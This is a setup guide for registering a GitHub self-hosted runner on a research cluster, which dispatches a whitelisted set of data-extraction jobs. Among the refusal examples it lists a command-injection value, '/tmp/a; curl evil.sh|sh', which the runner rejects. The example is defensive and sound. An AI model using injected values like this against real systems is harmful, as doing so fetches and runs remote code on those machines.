# Cluster runner — one-time setup

~15 minutes, once. After this, jobs dispatch from GitHub and you stop getting
markdown files over DM.

The system is already merged and live on `main`. The only missing piece is a
runner registered on your side — right now `total_count` is 0 and the workflow
has fired zero times.

---

## What changes for you

**Today:** I send a markdown file, you run commands by hand, zip results, send
them back.

**After:** a job appears in the queue, runs, and its evidence uploads
automatically. **You never execute a command I wrote.**

I pick a job *name* from `ops/jobs.yaml`. `scripts/ops/run_job.py` builds the
command line itself and refuses anything not in that file. Three jobs exist:
`smoke`, `seal_holdout`, `extract_c18`. There is a test in the repo asserting
that list cannot quietly grow — adding a job requires a commit you can review.

Refusals, all tested:

```
REFUSED: 'rm_rf' is not a registered job.
REFUSED: raw_dir: unsafe path '../../etc'
REFUSED: raw_dir: unsafe path '/tmp/a; curl evil.sh|sh'
REFUSED: workers=9999 above max 64
```

`ops/jobs.yaml` is the entire trust boundary and it is short enough to read in
one sitting.

## Security

- **Repo is private.** This matters — a self-hosted runner on a *public* repo
  lets anyone open a PR that runs code on your machine. Ours is private.
- **No inbound ports.** The runner polls outward. Nothing reaches in.
- **No credentials.** Nothing here asks for your cluster password or SSH key,
  and none is stored in the repo.
- **Kill switch:** `sudo ./svc.sh stop && sudo ./svc.sh uninstall`, then remove
  the runner in Settings. No other cleanup.

## Install

GitHub → Settings → Actions → Runners → **New self-hosted runner**, then:

```bash
mkdir -p ~/actions-runner && cd ~/actions-runner
# download URL + token from that page; token expires in ~1 hour
tar xzf actions-runner-linux-x64-*.tar.gz

./config.sh --url https://github.com/ptlnextdoor/Kahlus-V1 \
            --token <TOKEN_FROM_THE_PAGE> \
            --labels kahlus-cluster \
            --name chapman \
            --work _work --unattended

sudo ./svc.sh install && sudo ./svc.sh start   # survives reboot
sudo ./svc.sh status
```

**The label must be `kahlus-cluster`.**

### If a runner on the cluster node is not allowed

Install it on the Pi instead. Then tell me, and I will prefix each `command` in
`ops/jobs.yaml` with your SSH invocation — your key stays on the Pi and the
workflow never sees it. Same result, no runner on the cluster itself.

## Dependencies

```bash
python3 -m pip install --user wfdb numpy scipy pyyaml
python3 -c "import wfdb, numpy, scipy, yaml; print('ok')"
aws s3 ls --no-sign-request s3://physionet-open/challenge-2018/1.0.0/training/ | head -3
```

If that last command fails, the compute node has no outbound internet — tell me
and we will route the fetch differently.

## Verify — 30 seconds, before committing to anything real

Actions tab → **cluster job** → Run workflow → job `smoke`, tick **dry_run**.

It resolves the command line and prints it **without executing**. If the argv
looks right, run again without `dry_run` — `smoke` only touches 5 records.

## What comes back

Every run uploads an `evidence/` artifact with `result.json` (job, params, argv,
exit code, elapsed, commit SHA, hostname) and `run.log`. I read it from GitHub.
Nothing to zip or send.

---

## Why this is worth 15 minutes now

Two things are blocked on it:

1. **`extract_c18` has never run.** The 994-subject PhysioNet Challenge-2018
   corpus is still at 0 subjects extracted.
2. **A capacity sweep** — 4 model classes × 3 horizons × 78 subjects — that is
   minutes on an A100 and overnight-per-configuration on a laptop. It is the
   experiment that decides whether our forecasting direction has real headroom
   or is already at its ceiling, and it currently gates the rest of the research
   plan.

Full reference: `docs/ops/RUNNER_SETUP_FOR_KRISH.md`.
